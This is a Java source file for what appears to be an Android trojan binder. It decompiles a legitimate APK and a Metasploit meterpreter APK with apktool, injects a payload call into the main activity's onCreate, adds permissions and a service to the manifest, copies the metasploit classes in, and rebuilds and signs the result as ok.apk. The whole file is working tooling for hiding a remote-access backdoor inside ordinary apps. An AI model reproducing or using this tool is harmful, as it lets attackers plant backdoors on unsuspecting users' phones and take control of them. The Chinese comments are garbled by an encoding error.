package binder.main;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.util.ArrayList;
public class Main {
	static String mypath = "";
	static String readTxt(String filePath) throws IOException {
		File file = new File(filePath);
		//System.out.println("File Length:"+file.length());
		char []buf = new char[(int) file.length()];
		FileReader fReader = new FileReader(file);
		fReader.read(buf);
		String content="";
		for(int n=0;n<buf.length;n++) {
			content += String.valueOf(buf[n]);
		}
		//System.out.println(content);
		fReader.close();
		return content;
	}
	static void writeTxt(String path,String content) throws IOException{
		File file = new File(path);
		Writer writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "UTF-8"));
		writer.write(content);
		writer.close();
	}
	static String analyzeMainSmali(String ManifestPath) throws IOException {
		String Manifest = readTxt(ManifestPath);
		int pos = Manifest.indexOf("<activity android:");
		pos = Manifest.indexOf("android:name=\"",pos);
		pos = Manifest.indexOf("\"",pos+15);//Ѱ�ұպ�
		int pos2 = Manifest.lastIndexOf(".",pos);
		Manifest = Manifest.substring(pos2+1,pos);
		return Manifest+".smali";
	}
	static void insertPayload(String smaliPath) throws IOException {
		String smaliContent = readTxt(smaliPath);
		String flag = "invoke-";
		int pos = smaliContent.indexOf("onCreate");
		pos = smaliContent.indexOf(flag,pos);
		String smaliA = smaliContent.substring(0,pos);
		String smaliB = smaliContent.substring(pos);
		String newSmali = smaliA+StaticString.Payload+smaliB;
		writeTxt(smaliPath,newSmali);
	}
	static void changeManifest(String Path) throws IOException {
		String content = readTxt(Path);
		int pos = content.indexOf("<application android");
		String ManifestA = content.substring(0,pos);//<xml �� <application
		int posA = content.indexOf("</application>");
		String ManifestB = content.substring(pos,posA);//<application �� </application>
		String ManifestC = content.substring(posA);//</application>��β��
		String newManifest  = ManifestA+StaticString.permission+ManifestB+StaticString.serviceFlag+ManifestC;
		//System.out.println(newManifest);
		writeTxt(Path,newManifest);
	}
	static void runCMD(String command) throws IOException {
		Process process = Runtime.getRuntime().exec(command);
		InputStreamReader inputStreamReader = new InputStreamReader(process.getInputStream());
		BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
		String readLine = "";
		while((readLine=bufferedReader.readLine())!=null) {
			System.out.println(readLine);
		}
		if(bufferedReader!=null) {bufferedReader.close();}
		process.destroy();
		process = null;
	}
	static void unzipAPK(String apkPath,String outPath) throws IOException {
		runCMD("cmd.exe /c java -jar "+mypath+"\\apktool.jar d "+apkPath+" -o "+outPath);
	}
	public static void main(String[] args) throws IOException {
		// TODO �Զ����ɵķ������
		mypath = System.getProperty("user.dir");
		System.out.println(mypath);
		if(args.length < 2) {System.out.print("û������ָ������");return;}
		String apkPath = args[0];
		String msfapkPath = args[1];
		String sourcePath = mypath+"\\tmp\\apksource";//�����ӵ�apk������Ŀ¼
		String msfSourcePath = mypath + "\\tmp\\msfsource";//meterpreter apk������Ŀ¼
		String ManifestPath = sourcePath + "\\AndroidManifest.xml";//AndroidManifestĿ¼
		//����ɵ��ļ�
		System.out.println("�������ļ�...");
		runCMD("cmd /c rmdir /s/q "+mypath+"\\tmp");
		runCMD("cmd /c mkdir "+mypath+"\\tmp");
		//���
		System.out.println("��ѹĿ��apk�ļ�...");
		unzipAPK(apkPath,sourcePath);
		System.out.println("��ѹmeterpreter apk�ļ�...");
		unzipAPK(msfapkPath,msfSourcePath);
		//������smali�ļ�����
		System.out.println("androidManifest Path:"+ManifestPath);
		System.out.println("����smali�ļ�����...");
		String smaliName = analyzeMainSmali(ManifestPath);
		System.out.println("smali name:"+smaliName);
		//��ȡsmali�ļ�����·��
		System.out.println("ö�������ļ�...");
		TraverseDir tFolder = new TraverseDir();
		ArrayList<String> PathList = tFolder.TraverseFolder(sourcePath);
		System.out.println("File Number:"+PathList.size());
		String smaliPath = "";
		for(int n=0;n<PathList.size();n++) {
			String filePath = PathList.get(n);
			if(filePath.contains(smaliName)) {smaliPath = filePath;}
		}
		if (smaliPath=="") {System.out.println("Error��û���ҵ�smali");return;}
		System.out.println("smali path:"+smaliPath);
		//ִ��payload����
		System.out.println("����������payload��������...");
		insertPayload(smaliPath);
		System.out.println("�޸������ļ�...");
		changeManifest(ManifestPath);
		//����payload�ļ���
		System.out.println("����payload�ļ�....");
		runCMD("cmd /c xcopy "+msfSourcePath+"\\smali\\com\\metasploit "+sourcePath+"\\smali\\com\\metasploit\\ /e/Q");
		System.out.println("���������ļ�...");
		
		runCMD("cmd /c del "+sourcePath+"\\smali\\com\\metasploit\\stage\\MainBroadcastReceiver.smali");
		runCMD("cmd /c del "+sourcePath+"\\smali\\com\\metasploit\\stage\\MainActivity.smali");
		System.out.println("���apk...");
		runCMD("cmd /c java -jar "+mypath+"\\apktool.jar b "+sourcePath+" -o "+mypath+"\\ok.apk");
		System.out.println("������ok.apk�ڵ�ǰĿ¼��,���apk����ǩ��");
		runCMD("cmd /c start "+mypath+"\\QihoSigner");
	}

}
